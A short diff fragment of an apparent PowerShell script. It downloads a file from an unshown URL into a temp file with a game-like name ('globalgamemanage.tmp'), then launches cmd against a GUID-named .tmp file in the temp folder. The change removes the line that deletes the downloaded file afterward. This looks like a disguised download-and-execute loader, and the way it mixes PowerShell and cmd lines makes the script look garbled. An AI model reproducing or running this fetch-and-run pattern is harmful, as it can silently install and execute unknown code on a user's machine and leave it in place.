@@ -13,6 +13,4 @@ $TempExe = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.tmp"
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
 cmd
 "%TEMP%/e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
-powershell
 
-Remove-Item $TempExe -Force -ErrorAction SilentlyContinue
